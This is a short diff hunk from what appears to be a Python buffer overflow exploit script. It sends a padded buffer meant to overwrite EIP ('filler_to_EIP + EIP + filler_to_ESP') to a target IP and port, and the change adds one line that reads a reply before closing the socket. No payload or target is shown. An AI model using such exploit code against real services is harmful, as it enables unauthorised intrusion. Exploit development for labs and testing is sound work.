@@ -20,6 +20,7 @@ try:
   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target_IP, target_port))
   s.send(filler_to_EIP + EIP + filler_to_ESP)
+  s.recv(1024)
   s.close()
     
   # Print confirmation after a full socket creation, data sending, and tear down successfully occurs.
